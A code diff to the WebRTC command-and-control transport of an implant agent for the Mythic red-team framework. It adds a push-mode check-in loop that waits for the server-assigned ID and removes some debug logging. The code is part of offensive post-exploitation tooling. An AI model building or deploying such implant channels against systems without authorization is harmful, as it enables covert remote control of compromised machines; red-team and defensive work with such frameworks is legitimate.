@@ -676,6 +676,7 @@ func (c *C2WebRTC) CheckIn() structs.CheckInMessageResponse {
 	if err != nil {
 		utils.PrintDebug(fmt.Sprintf("error trying to marshal checkin data\n"))
 	}
+
 	for {
 		if c.ShouldStop {
 			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in checkin\n"))
@@ -692,12 +693,46 @@ func (c *C2WebRTC) CheckIn() structs.CheckInMessageResponse {
 				}
 			}
 		}
+
 		utils.PrintDebug(fmt.Sprintf("Checkin msg:  %v \n", checkinMsg))
 
+		// Send checkin message
 		resp := c.SendMessage(checkinMsg)
+
+		// For push mode, we need to handle the response differently
 		if c.TaskingType == TaskingTypePush {
-			return structs.CheckInMessageResponse{}
+			// In push mode, the response comes asynchronously through the data channel
+			// We need to wait for it or check if we're already registered
+			if GetMythicID() != "" && GetMythicID() != UUID {
+				// We already have a valid Mythic ID, consider checkin successful
+				utils.PrintDebug("Push mode: Already have valid Mythic ID, checkin considered successful")
+				return structs.CheckInMessageResponse{
+					Status: "success",
+					ID:     GetMythicID(),
+				}
+			}
+
+			// Wait for response through the data channel
+			timeout := time.After(30 * time.Second)
+			for {
+				select {
+				case <-timeout:
+					utils.PrintDebug("Timeout waiting for checkin response in push mode")
+					return structs.CheckInMessageResponse{Status: "failed"}
+				case <-time.After(1 * time.Second):
+					// Check if we got a Mythic ID through the async response
+					if GetMythicID() != "" && GetMythicID() != UUID {
+						utils.PrintDebug("Push mode: Received Mythic ID through async response")
+						return structs.CheckInMessageResponse{
+							Status: "success",
+							ID:     GetMythicID(),
+						}
+					}
+				}
+			}
 		}
+
+		// Poll mode - handle response synchronously
 		utils.PrintDebug(fmt.Sprintf("Response: %v\n", resp))
 		response := structs.CheckInMessageResponse{}
 		err := json.Unmarshal(resp, &response)
@@ -758,7 +793,6 @@ func (c *C2WebRTC) SendMessage(output []byte) []byte {
 			utils.PrintDebug("Data channel not established, can't send message")
 			return nil
 		}
-		utils.PrintDebug(fmt.Sprintf("SendMessage - Sending message bytes via datachannel: %v\n", messageBytes))
 		err = c.DataChannel.Send(messageBytes)
 		if err != nil {
 			utils.PrintDebug(fmt.Sprintf("Error sending WebRTC message: %v", err))
@@ -773,7 +807,6 @@ func (c *C2WebRTC) SendMessage(output []byte) []byte {
 
 // sendAndReceiveMessage sends a message via WebRTC and waits for a response
 func (c *C2WebRTC) sendAndReceiveMessage(messageBytes []byte) []byte {
-	utils.PrintDebug(fmt.Sprintf("sendAndReceiveMessage - Showing messageBytes: %v\n", messageBytes))
 	if c.DataChannel == nil {
 		utils.PrintDebug("Data channel not established, reconnecting")
 		go c.reconnect()
